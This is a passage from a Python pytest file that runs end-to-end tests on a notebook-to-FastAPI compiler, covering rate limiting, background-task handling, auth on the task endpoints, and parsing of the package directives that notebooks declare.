                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}
payload = {{"a": 1, "b": 2}}

for _ in range(25):
    resp = client.post("/add", json=payload, headers=headers)
    assert resp.status_code == 200, resp.text

info = client.get("/auth/info").json()
assert info["rate_limiting"] is False, info
assert info["rate_limit_per_minute"] is None, info

print("RATE_LIMIT_DISABLED_BY_DEFAULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "RATE_LIMIT_DISABLED_BY_DEFAULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_rate_limit_returns_429_once_exceeded(tmp_path):
    """NOTEBOOK_API_RATE_LIMIT_PER_MINUTE, once set, caps how many
    requests a single API key may make per rolling 60s window -- the
    (N+1)th request within the window must be rejected with 429 and a
    Retry-After header, while a *different* key's own window is
    unaffected (tracked independently per key, not globally).
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys

os.environ["NOTEBOOK_API_KEY"] = "key-a, key-b"
os.environ["NOTEBOOK_API_RATE_LIMIT_PER_MINUTE"] = "2"

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
payload = {{"a": 1, "b": 2}}
headers_a = {{"X-API-Key": "key-a"}}
headers_b = {{"X-API-Key": "key-b"}}

first = client.post("/add", json=payload, headers=headers_a)
assert first.status_code == 200, first.text

second = client.post("/add", json=payload, headers=headers_a)
assert second.status_code == 200, second.text

third = client.post("/add", json=payload, headers=headers_a)
assert third.status_code == 429, third.text
assert "Retry-After" in third.headers, third.headers
assert int(third.headers["Retry-After"]) >= 1, third.headers

other_key = client.post("/add", json=payload, headers=headers_b)
assert other_key.status_code == 200, other_key.text

info = client.get("/auth/info").json()
assert info["rate_limiting"] is True, info
assert info["rate_limit_per_minute"] == 2, info

print("RATE_LIMIT_429_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "RATE_LIMIT_429_E2E_OK" in proc.stdout


def test_compiler_pipeline_rate_limit_sends_x_ratelimit_headers(tmp_path):
    """Confirmed exploitable before this fix: a rate-limited request only
    ever got a Retry-After header, and only once it had already been
    rejected with 429 -- there was no X-RateLimit-Limit/-Remaining/-Reset
    on a *successful* response (the standard GitHub/Stripe-style
    contract), so a well-behaved caller had no way to see it was about to
    be throttled and back off on its own; the only signal was a 429 it
    had already triggered. Each header must also appear on the 429
    response itself, with Remaining pinned to 0 there.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys

os.environ["NOTEBOOK_API_KEY"] = "key-a"
os.environ["NOTEBOOK_API_RATE_LIMIT_PER_MINUTE"] = "2"

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
payload = {{"a": 1, "b": 2}}
headers = {{"X-API-Key": "key-a"}}

first = client.post("/add", json=payload, headers=headers)
assert first.status_code == 200, first.text
assert first.headers["X-RateLimit-Limit"] == "2", first.headers
assert first.headers["X-RateLimit-Remaining"] == "1", first.headers
assert int(first.headers["X-RateLimit-Reset"]) > 0, first.headers

second = client.post("/add", json=payload, headers=headers)
assert second.status_code == 200, second.text
assert second.headers["X-RateLimit-Remaining"] == "0", second.headers

third = client.post("/add", json=payload, headers=headers)
assert third.status_code == 429, third.text
assert third.headers["X-RateLimit-Limit"] == "2", third.headers
assert third.headers["X-RateLimit-Remaining"] == "0", third.headers
assert int(third.headers["X-RateLimit-Reset"]) > 0, third.headers

# An unauthenticated/unlimited endpoint (rate limiting only ever applies
# once a request has already authenticated via verify_api_key) gets none
# of these -- confirms they're not stamped globally on every response.
health = client.get("/health")
assert "X-RateLimit-Limit" not in health.headers, health.headers

print("RATE_LIMIT_HEADERS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "RATE_LIMIT_HEADERS_E2E_OK" in proc.stdout


def test_compiler_pipeline_typing_generic_and_enum_params_work_end_to_end(tmp_path):
    """Confirmed exploitable before this fix: a parameter typed with a
    typing-module generic (List[float], Optional[str], Dict[str, Any]) or
    a notebook-defined Enum produced a generated Pydantic field
    referencing a name nothing in the generated app imports. The class
    definition itself didn't fail (deferred annotation evaluation), but
    the very first real use -- building the schema for /docs, /openapi.json,
    or the first request -- raised PydanticUserError/NameError.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "from typing import List, Optional, Dict, Any\n"
                            "from enum import Enum\n\n"
                            "class Priority(Enum):\n"
                            "    LOW = 'low'\n"
                            "    HIGH = 'high'\n\n"
                            "def summarize(\n"
                            "    scores: List[float],\n"
                            "    label: Optional[str] = None,\n"
                            "    meta: Dict[str, Any] = None,\n"
                            "    priority: Optional[Priority] = None,\n"
                            ") -> str:\n"
                            "    return label or 'none'\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app, SummarizeRequest
from fastapi.testclient import TestClient

# Building the schema is exactly what raised PydanticUserError before this fix.
schema = SummarizeRequest.model_json_schema()
assert schema["properties"]["scores"]["type"] == "array", schema

client = TestClient(app)
resp = client.post(
    "/summarize",
    json={{"scores": [1.0, 2.0], "label": "x", "meta": {{"a": 1}}}},
    headers={{"X-API-Key": "notebook-to-api-dev-key"}},
)
assert resp.status_code == 200, resp.text
assert resp.json() == {{"result": "x"}}, resp.json()
print("TYPING_GENERIC_ENUM_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "TYPING_GENERIC_ENUM_E2E_OK" in proc.stdout


def test_compiler_pipeline_enum_default_param_is_usable_end_to_end(tmp_path):
    """Confirmed exploitable before this fix: a parameter defaulting to a
    notebook-defined Enum member (e.g. `priority: Priority = Priority.HIGH`)
    got repr()'d into the generated Pydantic model exactly like a literal
    default, silently turning it into the *string* "Priority.HIGH" instead
    of the actual enum member. A caller omitting that field to take its
    default then passed the raw string straight into the notebook's own
    function, which crashed with an AttributeError the moment it tried to
    use it as an actual Priority (e.g. `.value`).
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "from enum import Enum\n\n"
                            "class Priority(Enum):\n"
                            "    LOW = 'low'\n"
                            "    HIGH = 'high'\n\n"
                            "def set_priority(priority: Priority = Priority.HIGH) -> str:\n"
                            "    return priority.value\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

# Omitting "priority" entirely must fall back to the real Priority.HIGH
# enum member, not the string "Priority.HIGH".
default_resp = client.post("/set_priority", json={{}}, headers=headers)
assert default_resp.status_code == 200, default_resp.text
assert default_resp.json() == {{"result": "high"}}, default_resp.json()

explicit_resp = client.post(
    "/set_priority", json={{"priority": "low"}}, headers=headers
)
assert explicit_resp.status_code == 200, explicit_resp.text
assert explicit_resp.json() == {{"result": "low"}}, explicit_resp.json()

print("ENUM_DEFAULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "ENUM_DEFAULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_background_tasks_are_evicted_after_ttl_expires(tmp_path):
    """Confirmed exploitable before this fix: the generated TASKS registry
    never evicted anything on its own -- a long-running deployment
    handling steady background-task traffic accumulated one entry per
    call forever. With TASK_TTL_SECONDS forced to 0 (via the
    NOTEBOOK_API_TASK_TTL_SECONDS env var the generated app already
    reads), a task created before a second task must be gone by the time
    the second one is created, since eviction runs opportunistically on
    every new task's creation.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def process_data(x: int) -> int:\n"
                            "    return x\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys
import time

os.environ["NOTEBOOK_API_TASK_TTL_SECONDS"] = "0"

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

first = client.post("/process_data", json={{"x": 1}}, headers=headers)
assert first.status_code == 200, first.text
first_task_id = first.json()["task_id"]

# Any nonzero elapsed time exceeds a TTL of 0, so the first task is
# eligible for eviction by the time the second one is created.
time.sleep(0.01)

second = client.post("/process_data", json={{"x": 2}}, headers=headers)
assert second.status_code == 200, second.text

lookup = client.get(f"/tasks/{{first_task_id}}", headers=headers)
assert lookup.status_code == 404, lookup.text
assert first_task_id in lookup.json()["detail"], lookup.json()

print("TASK_TTL_EVICTION_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "TASK_TTL_EVICTION_E2E_OK" in proc.stdout


def test_compiler_pipeline_unknown_task_id_returns_404(tmp_path):
    """Confirmed exploitable before this fix: GET/DELETE /tasks/{task_id}
    for a task_id that was never created (or has since been evicted --
    see test_compiler_pipeline_background_tasks_are_evicted_after_ttl_expires
    above, or simply deleted by another caller) returned HTTP 200 with a
    body of {"error": "Task not found"}, instead of a 404. That's not
    just a wrong status code for its own sake: this is the exact endpoint
    the generated Python/TypeScript SDK's get_task/wait_for_task poll
    (backend/exporters/sdk_generator.py), and both rely on
    response.raise_for_status() to signal failure -- which never fires
    for a 200. wait_for_task additionally only checks whether
    task.get('status') != 'processing' to decide a task is "finished",
    so a task_id that no longer exists reads as status=None, which is
    trivially != 'processing' -- meaning wait_for_task returned
    {"error": "Task not found"} straight to the caller as if it were the
    task's actual, successful result, with no exception raised at all.
    Now a real 404 lets raise_for_status() do its job.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def process_data(x: int) -> int:\n"
                            "    return x\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

lookup = client.get("/tasks/does-not-exist", headers=headers)
assert lookup.status_code == 404, lookup.text
assert "does-not-exist" in lookup.json()["detail"], lookup.json()

deletion = client.delete("/tasks/does-not-exist", headers=headers)
assert deletion.status_code == 404, deletion.text
assert "does-not-exist" in deletion.json()["detail"], deletion.json()

print("UNKNOWN_TASK_ID_404_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "UNKNOWN_TASK_ID_404_E2E_OK" in proc.stdout


def test_compiler_pipeline_background_task_with_unserializable_result_is_reported_as_failed(
    tmp_path,
):
    """Confirmed exploitable before this fix: a background function
    returning something FastAPI's own response serialization can't
    encode (e.g. a complex number -- Python builtin, no extra dependency
    needed to demonstrate this; a raw numpy array or pandas DataFrame is
    the more common real-world case for "process_data", an entirely
    ordinary thing for the 'process'/'train'/'generate'/'embed' keywords
    that route a function to a background task in the first place, but
    requires numpy as a test dependency this project doesn't otherwise
    have) marked the task "completed" with that unserializable result
    stored as-is. GET /tasks/{task_id} then crashed with an unhandled
    500 the moment FastAPI tried to serialize the response -- and so did
    GET /tasks entirely, for *every* task in the registry, not just the
    offending one, since it returns them all in a single response.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def process_data(x: int) -> object:\n"
                            "    return object()\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
import time

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

submitted = client.post("/process_data", json={{"x": 5}}, headers=headers)
assert submitted.status_code == 200, submitted.text
task_id = submitted.json()["task_id"]

deadline = time.time() + 5
while True:
    lookup = client.get(f"/tasks/{{task_id}}", headers=headers)
    assert lookup.status_code == 200, lookup.text
    if lookup.json().get("status") != "processing":
        break
    assert time.time() < deadline, "task never left processing"
    time.sleep(0.01)

task = lookup.json()
assert task["status"] == "failed", task
assert "error" in task, task
assert "result" not in task, task

# GET /tasks must still succeed too -- not crash for *every* task in the
# registry just because one of them has an unserializable result.
listing = client.get("/tasks", headers=headers)
assert listing.status_code == 200, listing.text
assert listing.json()["tasks"][task_id]["status"] == "failed"

print("UNSERIALIZABLE_RESULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "UNSERIALIZABLE_RESULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_background_task_result_is_run_through_jsonable_encoder(
    tmp_path,
):
    """A JSON-safe result (unlike the numpy case above) must still be
    delivered correctly -- and jsonable_encoder should actually convert a
    type json.dumps alone can't handle natively (a datetime) into a
    JSON-safe value, rather than merely happening not to break on it.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "import datetime\n\n"
                            "def generate_report(year: int) -> dict:\n"
                            "    return {\n"
                            "        'year': year,\n"
                            "        'generated_on': datetime.date(2024, 1, 1),\n"
                            "    }\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
import time

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

submitted = client.post("/generate_report", json={{"year": 2024}}, headers=headers)
assert submitted.status_code == 200, submitted.text
task_id = submitted.json()["task_id"]

deadline = time.time() + 5
while True:
    lookup = client.get(f"/tasks/{{task_id}}", headers=headers)
    assert lookup.status_code == 200, lookup.text
    if lookup.json().get("status") != "processing":
        break
    assert time.time() < deadline, "task never left processing"
    time.sleep(0.01)

task = lookup.json()
assert task["status"] == "completed", task
assert task["result"] == {{"year": 2024, "generated_on": "2024-01-01"}}, task

print("JSONABLE_ENCODER_RESULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "JSONABLE_ENCODER_RESULT_E2E_OK" in proc.stdout


def _free_tcp_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def _wait_until_serving(base_url, deadline):
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{base_url}/health", timeout=1):
                return
        except (urllib.error.URLError, ConnectionError):
            time.sleep(0.05)
    raise TimeoutError(f"Server at {base_url} never became ready")


def test_compiler_pipeline_background_task_does_not_block_the_event_loop(tmp_path):
    """Confirmed exploitable before this fix: _run_background_task called
    a synchronous notebook function directly, which ran its entire body
    inline on this app's single asyncio event loop -- the exact same loop
    every other request, including a completely unrelated GET /health,
    is served from. Confirmed against a real (non-TestClient) uvicorn
    server: a background task doing nothing but time.sleep(1) froze a
    concurrent GET /health for the full second, the opposite of what
    "background" is supposed to mean -- and especially damaging since the
    "train"/"process"/"generate"/"embed"/"scrape" keywords that route a
    function to a background task in the first place are routinely slow,
    CPU-bound work, not quick one-liners.

    Runs a real uvicorn subprocess (TestClient's in-process request
    handling doesn't reliably reproduce this class of event-loop-blocking
    bug) and measures how long a concurrent GET /health actually takes
    while a slow background task is in flight.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "import time\n\n"
                            "def train_slow(x: int) -> int:\n"
                            "    time.sleep(1)\n"
                            "    return x\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    from backend.compiler import compile_notebook

    compile_notebook(str(notebook_path), str(workdir / "generated"))

    port = _free_tcp_port()
    base_url = f"http://127.0.0.1:{port}"

    env = dict(os.environ)
    env["PYTHONPATH"] = f"{PROJECT_ROOT}{os.pathsep}{workdir}{os.pathsep}{env.get('PYTHONPATH', '')}"

    server = subprocess.Popen(
        [
            sys.executable, "-m", "uvicorn", "generated.app:app",
            "--host", "127.0.0.1", "--port", str(port),
        ],
        cwd=str(workdir),
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        _wait_until_serving(base_url, time.time() + 20)

        headers = {"X-API-Key": "notebook-to-api-dev-key", "Content-Type": "application/json"}
        submit_req = urllib.request.Request(
            f"{base_url}/train_slow", data=b'{"x": 5}', headers=headers, method="POST"
        )
        with urllib.request.urlopen(submit_req, timeout=5) as resp:
            task_id = json.loads(resp.read())["task_id"]

        # The background task is now "processing" (it sleeps for a full
        # second). A concurrent, completely unrelated request must not be
        # stuck waiting behind it -- generously bounded well under the
        # task's own 1s sleep to leave room for scheduling jitter, while
        # still being a strong signal against the ~1s this took before
        # this fix.
        start = time.monotonic()
        with urllib.request.urlopen(f"{base_url}/health", timeout=5):
            pass
        elapsed = time.monotonic() - start

        assert elapsed < 0.5, (
            f"GET /health took {elapsed:.3f}s while a background task was "
            "running -- the event loop is still being blocked"
        )

        # The task itself must still actually complete with the right
        # result, not just "not block anything else".
        deadline = time.time() + 10
        while True:
            with urllib.request.urlopen(
                urllib.request.Request(f"{base_url}/tasks/{task_id}", headers=headers),
                timeout=5,
            ) as resp:
                task = json.loads(resp.read())
            if task["status"] != "processing":
                break
            assert time.time() < deadline, "task never left processing"
            time.sleep(0.05)

        assert task == {
            "status": "completed",
            "result": 5,
            "created_at": task["created_at"],
            "callback_url": None,
            "endpoint": "/train_slow",
        }

    finally:
        server.terminate()
        try:
            server.wait(timeout=5)
        except subprocess.TimeoutExpired:
            server.kill()
            server.wait(timeout=5)


def test_compiler_pipeline_background_endpoint_rejects_tasks_past_the_configured_limit(
    tmp_path,
):
    """Confirmed exploitable before this fix: _evict_expired_tasks only
    bounds TASKS' *long-term* growth (nothing older than
    TASK_TTL_SECONDS survives) -- a burst of requests arriving faster
    than that TTL still grew TASKS without any limit in the meantime.
    With NOTEBOOK_API_MAX_TASKS forced to 2, a third concurrent
    background request must be refused with 503 instead of silently
    accepted.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def train_model(epochs: int) -> str:\n"
                            "    return 'done'\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys

os.environ["NOTEBOOK_API_MAX_TASKS"] = "2"

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

first = client.post("/train_model", json={{"epochs": 1}}, headers=headers)
assert first.status_code == 200, first.text

second = client.post("/train_model", json={{"epochs": 1}}, headers=headers)
assert second.status_code == 200, second.text

third = client.post("/train_model", json={{"epochs": 1}}, headers=headers)
assert third.status_code == 503, third.text
assert "Too many pending background tasks" in third.text, third.text

print("MAX_PENDING_TASKS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "MAX_PENDING_TASKS_E2E_OK" in proc.stdout


def test_compiler_pipeline_tasks_endpoints_reject_unauthenticated_requests(tmp_path):
    """Confirmed exploitable before this fix: GET /tasks and GET
    /tasks/{task_id} returned stored function call inputs/outputs with no
    API key at all, and the DELETE/POST tasks endpoints let anyone wipe
    task state -- every other endpoint in the generated app (including
    /auth/validate) required Depends(verify_api_key), but the entire
    /tasks family was left open.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def process_data(x: int) -> int:\n"
            "    return x\n"
        )
    )

    notebook_path = tmp_path / "tasksauth.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(output_dir.parent)!r})

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)

assert client.get("/tasks").status_code == 401
assert client.get("/tasks/whatever").status_code == 401
assert client.delete("/tasks/completed").status_code == 401
assert client.delete("/tasks/failed").status_code == 401
assert client.post("/tasks/cleanup").status_code == 401
assert client.post("/tasks/reset").status_code == 401
assert client.delete("/tasks/whatever").status_code == 401

headers = {{"X-API-Key": "notebook-to-api-dev-key"}}
assert client.get("/tasks", headers=headers).status_code == 200
assert client.post("/tasks/reset", headers=headers).status_code == 200

print("TASKS_AUTH_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(output_dir.parent),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "TASKS_AUTH_E2E_OK" in proc.stdout

def test_extract_explicit_requirements_finds_a_directive_in_a_cell():

    code_cells = [
        "# notebook-to-api: requires opencv-python-headless==4.9.0.80\n"
        "import pandas\n"
    ]

    assert _extract_explicit_requirements(code_cells) == [
        "opencv-python-headless==4.9.0.80"
    ]


def test_extract_explicit_requirements_finds_a_directive_indented_inside_a_function():

    code_cells = [
        "def f() -> int:\n"
        "    # notebook-to-api: requires extra-runtime-only-pkg==2.0\n"
        "    return 1\n"
    ]

    assert _extract_explicit_requirements(code_cells) == [
        "extra-runtime-only-pkg==2.0"
    ]


def test_extract_explicit_requirements_supports_a_vcs_or_extras_spec():

    code_cells = [
        "# notebook-to-api: requires my-private-pkg @ git+https://example.com/pkg.git\n"
        "# notebook-to-api: requires somepkg[extra]==1.2.3\n"
    ]

    specs = _extract_explicit_requirements(code_cells)

    assert "my-private-pkg @ git+https://example.com/pkg.git" in specs
    assert "somepkg[extra]==1.2.3" in specs


def test_extract_explicit_requirements_deduplicates_exact_matches_across_cells():

    code_cells = [
        "# notebook-to-api: requires somepkg==1.0\n",
        "# notebook-to-api: requires somepkg==1.0\n",
    ]

    assert _extract_explicit_requirements(code_cells) == ["somepkg==1.0"]


def test_extract_explicit_requirements_ignores_an_unrelated_comment():

    code_cells = [
        "# this notebook-to-api project requires careful review\n"
        "import pandas\n"
    ]

    assert _extract_explicit_requirements(code_cells) == []


def test_extract_explicit_requirements_returns_an_empty_list_with_no_directives():

    code_cells = ["import pandas\n\ndef f() -> int:\n    return 1\n"]

    assert _extract_explicit_requirements(code_cells) == []


def test_extract_explicit_requirements_ignores_a_directive_inside_a_docstring():
    """Confirmed exploitable before this fix: a notebook author
    documenting this tool's own directive syntax inside a function's
    docstring -- an entirely ordinary way to explain a convention to
    teammates -- silently activated a real "requires" directive, adding
    a bogus requirements.txt line for a package that was never actually
    needed.
    """

    code_cells = [
        "def compute(x):\n"
        '    """\n'
        "    Notebook convention docs:\n"
        "    # notebook-to-api: requires some-fake-package==1.0\n"
        "    (just documenting the syntax here, not actually needed)\n"
        '    """\n'
        "    return x\n"
    ]

    assert _extract_explicit_requirements(code_cells) == []


def test_extract_explicit_requirements_still_finds_a_directive_right_after_a_docstring():

    code_cells = [
        "def compute(x):\n"
        '    """A normal docstring."""\n'
        "    # notebook-to-api: requires real-package==2.0\n"
        "    return x\n"
    ]

    assert _extract_explicit_requirements(code_cells) == ["real-package==2.0"]


def test_extract_explicit_apt_packages_finds_a_directive_in_a_cell():

    code_cells = [
        "# notebook-to-api: apt-requires libpq-dev\n"
        "import psycopg2\n"
    ]

    assert _extract_explicit_apt_packages(code_cells) == ["libpq-dev"]


def test_extract_explicit_apt_packages_finds_a_directive_indented_inside_a_function():

    code_cells = [
        "def f() -> int:\n"
        "    # notebook-to-api: apt-requires libgl1\n"
        "    return 1\n"
    ]

    assert _extract_explicit_apt_packages(code_cells) == ["libgl1"]


def test_extract_explicit_apt_packages_supports_a_version_pin():

    code_cells = [
        "# notebook-to-api: apt-requires libpq-dev=13.11-0+deb12u1\n"
    ]

    assert _extract_explicit_apt_packages(code_cells) == [
        "libpq-dev=13.11-0+deb12u1"
    ]


def test_extract_explicit_apt_packages_deduplicates_exact_matches_across_cells():

    code_cells = [
        "# notebook-to-api: apt-requires libpq-dev\n",
        "# notebook-to-api: apt-requires libpq-dev\n",
    ]

    assert _extract_explicit_apt_packages(code_cells) == ["libpq-dev"]


def test_extract_explicit_apt_packages_preserves_first_seen_order_across_cells():

    code_cells = [
        "# notebook-to-api: apt-requires libpq-dev\n",
